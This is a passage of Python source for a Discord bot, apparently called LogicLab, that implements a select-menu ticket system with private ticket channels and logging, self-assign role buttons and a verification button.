                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            if interaction.values[0] == ticketSname41:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            try:
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes41}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes41}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            
            if interaction.values[0] == ticketSname42:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            try:
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes42}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes42}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            if interaction.values[0] == ticketSname43:
                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                if test_channel:
                    await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                if not test_channel:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    catid = categoryticketopenid
                    for category in guild.categories:
                        if category.id == catid:
                            try:
                                description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                            except:
                                ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                            try:
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes43}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                bot_role = select.guild.get_role(ticket_staff_role)
                                await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                await asyncio.sleep(2)
                                await ticket.send(embed=embed, view=ccTicket())
                                await asyncio.sleep(2)
                                message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                await message.delete()
                            except:
                                print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                            embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes43}``**", color=colorembed)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                            if channel:
                                await asyncio.sleep(4)
                                await channel.send(embed=embed)
                            if not channel:
                                await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

            ticket_staff.close()
            categoryticketopen.close()



try:
    if ticketnumber == 5:
        class ticketselect5(discord.ui.View):
            @discord.ui.select(
                placeholder = "select menu",
                min_values = 1,
                max_values = 1,
                options = [
                    discord.SelectOption(
                        label=f"{ticketSname5}",
                        description=f"{ticketSdes5}",
                        emoji=f"{ticketSem5}"
                    ),
                    discord.SelectOption(
                        label=f"{ticketSname51}",
                        description=f"{ticketSdes51}",
                        emoji=f"{ticketSem51}"
                    ),
                    discord.SelectOption(
                        label=f"{ticketSname52}",
                        description=f"{ticketSdes52}",
                        emoji=f"{ticketSem52}"
                    ),
                    discord.SelectOption(
                        label=f"{ticketSname53}",
                        description=f"{ticketSdes53}",
                        emoji=f"{ticketSem53}"
                    ),
                    discord.SelectOption(
                        label=f"{ticketSname54}",
                        description=f"{ticketSdes54}",
                        emoji=f"{ticketSem54}"
                    ),
                ]
            )
            async def select_callback(self, select, interaction: discord.Interaction,):
                categoryticketopen = open("systems\\ticket\\category-ticket-open.txt", "r")
                categoryticketopenid = int(categoryticketopen.read())
                ticket_staff = open("systems\\ticket\\ticket-staff-role-id.txt", "r")
                ticket_staff_role = int(ticket_staff.read())
                rolee = discord.utils.get(guild.roles, id=ticket_staff_role)
                if interaction.values[0] == ticketSname5:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    if test_channel:
                        await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                    if not test_channel:
                        test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                        catid = categoryticketopenid
                        for category in guild.categories:
                            if category.id == catid:
                                try:
                                    description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                                except:
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                                await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                try:
                                    embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes5}``**", color=colorembed)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                    await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                    await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                    bot_role = select.guild.get_role(ticket_staff_role)
                                    await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                    await asyncio.sleep(2)
                                    await ticket.send(embed=embed, view=ccTicket())
                                    await asyncio.sleep(2)
                                    message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                    await message.delete()
                                except:
                                    print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes5}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                if channel:
                                    await asyncio.sleep(4)
                                    await channel.send(embed=embed)
                                if not channel:
                                    await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                    channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                    await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

                if interaction.values[0] == ticketSname51:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    if test_channel:
                        await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                    if not test_channel:
                        test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                        catid = categoryticketopenid
                        for category in guild.categories:
                            if category.id == catid:
                                try:
                                    description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                                except:
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                                try:
                                    await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                    embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes51}``**", color=colorembed)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                    await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                    await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                    bot_role = select.guild.get_role(ticket_staff_role)
                                    await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                    await asyncio.sleep(2)
                                    await ticket.send(embed=embed, view=ccTicket())
                                    await asyncio.sleep(2)
                                    message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                    await message.delete()
                                except:
                                    print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes51}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                if channel:
                                    await asyncio.sleep(4)
                                    await channel.send(embed=embed)
                                if not channel:
                                    await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                    channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                    await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

                
                if interaction.values[0] == ticketSname52:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    if test_channel:
                        await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                    if not test_channel:
                        test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                        catid = categoryticketopenid
                        for category in guild.categories:
                            if category.id == catid:
                                try:
                                    description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                                except:
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                                try:
                                    await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                    embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes52}``**", color=colorembed)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                    await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                    await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                    bot_role = select.guild.get_role(ticket_staff_role)
                                    await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                    await asyncio.sleep(2)
                                    await ticket.send(embed=embed, view=ccTicket())
                                    await asyncio.sleep(2)
                                    message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                    await message.delete()
                                except:
                                    print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes52}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                if channel:
                                    await asyncio.sleep(4)
                                    await channel.send(embed=embed)
                                if not channel:
                                    await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                    channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                    await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

                if interaction.values[0] == ticketSname53:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    if test_channel:
                        await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                    if not test_channel:
                        test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                        catid = categoryticketopenid
                        for category in guild.categories:
                            if category.id == catid:
                                try:
                                    description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                                except:
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                                try:
                                    await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                    embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes53}``**", color=colorembed)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                    await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                    await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                    bot_role = select.guild.get_role(ticket_staff_role)
                                    await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                    await asyncio.sleep(2)
                                    await ticket.send(embed=embed, view=ccTicket())
                                    await asyncio.sleep(2)
                                    message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                    await message.delete()
                                except:
                                    print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes53}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                if channel:
                                    await asyncio.sleep(4)
                                    await channel.send(embed=embed)
                                if not channel:
                                    await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                    channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                    await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)





                if interaction.values[0] == ticketSname54:
                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                    if test_channel:
                        await select.response.send_message(f"You have an open ticket {select.user.id}", ephemeral = True)
                    if not test_channel:
                        test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                        catid = categoryticketopenid
                        for category in guild.categories:
                            if category.id == catid:
                                try:
                                    description = f"Username: {select.user.name}#{select.user.discriminator}\nID: {select.user.id}\nTicket Creation time: {datetime.now()}"
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic=description, category=category)
                                except:
                                    ticket = await guild.create_text_channel(name=f"{select.user.id}-ticket", topic="None", category=category)
                                try:
                                    await select.response.send_message(f"The ticket was created successfully", ephemeral = True)
                                    embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**{rolee.mention}\nticket was opened by {select.user.mention}\n``User Info\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes54}``**", color=colorembed)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                    test_channel = discord.utils.get(guild.channels, name=f"{select.user.id}-ticket")
                                    await ticket.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)
                                    await ticket.set_permissions(select.user, read_messages=True, send_messages=True)
                                    bot_role = select.guild.get_role(ticket_staff_role)
                                    await ticket.set_permissions(bot_role, read_messages=True, send_messages=True)
                                    await asyncio.sleep(2)
                                    await ticket.send(embed=embed, view=ccTicket())
                                    await asyncio.sleep(2)
                                    message = await ticket.send(f"{rolee.mention} | {select.user.mention}")
                                    await message.delete()
                                except:
                                    print(f"{Fore.LIGHTYELLOW_EX}Error: Staff Role is not set.\nSet the staff role so the system could finish up{Fore.WHITE}")

                                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is opened\n``Information about the user who opened the ticket\n\nUser Name: {select.user.name}#{select.user.discriminator}\nUser ID: {select.user.id}\nTicket Creation time: {datetime.now()}\nReason: {ticketSdes54}``**", color=colorembed)
                                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                embed.set_thumbnail(url=f"{servericon}")
                                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                if channel:
                                    await asyncio.sleep(4)
                                    await channel.send(embed=embed)
                                if not channel:
                                    await guild.create_text_channel(name="〈📋〉ticketlogs", category=categorylogss)
                                    channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                                    await channel.set_permissions(select.guild.default_role, read_messages=False, send_messages=False)

                ticket_staff.close()
                categoryticketopen.close()
except:
    print("Error")


if getroles_system == "true":
    class getroles(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)

        for dir in os.listdir("systems\\getroles\\buttons"):
            n = open(f"systems\\getroles\\buttons\\{dir}\\name.txt", encoding="utf-8")
            getrname = n.read()
            n.close()
            i = open(f"systems\\getroles\\buttons\\{dir}\\tof.txt", encoding="utf-8")
            getrid = i.read()
            i.close()
            e = open(f"systems\\getroles\\buttons\\{dir}\\emoji.txt", encoding="utf-8")
            getremoji = e.read()
            e.close()
            r = open(f"systems\\getroles\\buttons\\{dir}\\roleid.txt", encoding="utf-8")
            global getroleid
            getroleid = int(r.read())
            r.close()
            global buttonnn1
            global buttonnn2
            global buttonnn3
            global buttonnn4
            global buttonnn5
            global buttonnn6
            if getrid == "button1true":
                buttonnn1 = getroleid
            if getrid == "button2true":
                buttonnn2 = getroleid
            if getrid == "button3true":
                buttonnn3 = getroleid
            if getrid == "button4true":
                buttonnn4 = getroleid
            if getrid == "button5true":
                buttonnn5 = getroleid
            if getrid == "button6true":
                buttonnn6 = getroleid

            if getrid == "button1true":
                @discord.ui.button(label=f'〈{getremoji}〉{getrname}', style=discord.ButtonStyle.blurple, custom_id=f'Getrole_view:getrole1')
                async def getrole1(self, interaction: discord.Interaction, button: discord.ui.Button):
                    bot.role = interaction.guild.get_role(buttonnn1)
                    if bot.role not in interaction.user.roles:
                        await interaction.user.add_roles(bot.role)
                        await interaction.response.send_message(f"I have given you {bot.role.mention}!", ephemeral = True)
                    if bot.role in interaction.user.roles:
                        await interaction.response.send_message(f"I removed the roles for you {bot.role.mention}!", ephemeral = True)
                        await interaction.user.remove_roles(bot.role)

            if getrid == "button2true":
                @discord.ui.button(label=f'〈{getremoji}〉{getrname}', style=discord.ButtonStyle.blurple, custom_id=f'Getrole_view:getrole2')
                async def getrole2(self, interaction: discord.Interaction, button: discord.ui.Button):
                    bot.role = interaction.guild.get_role(buttonnn2)
                    if bot.role not in interaction.user.roles:
                        await interaction.user.add_roles(bot.role)
                        await interaction.response.send_message(f"I have given you {bot.role.mention}!", ephemeral = True)
                    if bot.role in interaction.user.roles:
                        await interaction.response.send_message(f"I removed the roles for you {bot.role.mention}!", ephemeral = True)  
                        await interaction.user.remove_roles(bot.role)
            


            if getrid == "button3true":
                @discord.ui.button(label=f'〈{getremoji}〉{getrname}', style=discord.ButtonStyle.blurple, custom_id=f'Getrole_view:getrole3')
                async def getrole3(self, interaction: discord.Interaction, button: discord.ui.Button):
                    bot.role = interaction.guild.get_role(buttonnn3)
                    if bot.role not in interaction.user.roles:
                        await interaction.user.add_roles(bot.role)
                        await interaction.response.send_message(f"I have given you {bot.role.mention}!", ephemeral = True)
                    if bot.role in interaction.user.roles:
                        await interaction.response.send_message(f"I removed the roles for you {bot.role.mention}!", ephemeral = True)  
                        await interaction.user.remove_roles(bot.role)



            if getrid == "button4true":
                @discord.ui.button(label=f'〈{getremoji}〉{getrname}', style=discord.ButtonStyle.blurple, custom_id=f'Getrole_view:getrole4')
                async def getrole4(self, interaction: discord.Interaction, button: discord.ui.Button):
                    bot.role = interaction.guild.get_role(buttonnn4)
                    if bot.role not in interaction.user.roles:
                        await interaction.user.add_roles(bot.role)
                        await interaction.response.send_message(f"I have given you {bot.role.mention}!", ephemeral = True)
                    if bot.role in interaction.user.roles:
                        await interaction.user.remove_roles(bot.role)
                        await interaction.response.send_message(f"I removed the roles for you {bot.role.mention}!", ephemeral = True)  


            if getrid == "button5true":
                @discord.ui.button(label=f'〈{getremoji}〉{getrname}', style=discord.ButtonStyle.blurple, custom_id=f'Getrole_view:getrole5')
                async def getrole5(self, interaction: discord.Interaction, button: discord.ui.Button):
                    bot.role = interaction.guild.get_role(buttonnn5)
                    if bot.role not in interaction.user.roles:
                        await interaction.user.add_roles(bot.role)
                        await interaction.response.send_message(f"I have given you {bot.role.mention}!", ephemeral = True)
                    if bot.role in interaction.user.roles:
                        await interaction.response.send_message(f"I removed the roles for you {bot.role.mention}!", ephemeral = True)  
                        await interaction.user.remove_roles(bot.role)

            
            if getrid == "button6true":
                @discord.ui.button(label=f'〈{getremoji}〉{getrname}', style=discord.ButtonStyle.blurple, custom_id=f'Getrole_view:getrole6')
                async def getrole6(self, interaction: discord.Interaction, button: discord.ui.Button):
                    bot.role = interaction.guild.get_role(buttonnn6)
                    if bot.role not in interaction.user.roles:
                        await interaction.user.add_roles(bot.role)
                        await interaction.response.send_message(f"I have given you {bot.role.mention}!", ephemeral = True)
                    if bot.role in interaction.user.roles:
                        await interaction.response.send_message(f"I removed the roles for you {bot.role.mention}!", ephemeral = True)  
                        await interaction.user.remove_roles(bot.role)
#except:
#    print("Get Roles Error")

if not os.path.exists("systems\\CustomUI\\verify1.txt"):
    class Verify1(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)


        @discord.ui.button(label='〈✅〉verify', style=discord.ButtonStyle.green, custom_id='Verify1_view:verify')
        async def Verify1(self, interaction: discord.Interaction, button: discord.ui.Button):
            try:
                member = discord.utils.get(interaction.guild.members, id=interaction.user.id)
                botrole = discord.utils.get(guild.roles, id=getroleverifyid)
                if botrole not in member.roles:
                    await member.add_roles(botrole)
                    await interaction.response.send_message(f"I have given you {botrole.mention}!", ephemeral=True)
                else:
                    await interaction.response.send_message(f"You already have the role", ephemeral=True)
            except:
                print("Missing Permissions")

if os.path.exists("systems\\CustomUI\\verify1.txt"):
    class Verify1(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)


        @discord.ui.button(label='verify', style=discord.ButtonStyle.green, custom_id='Verify1_view:verify', emoji=f"{emojiverifyu}",)
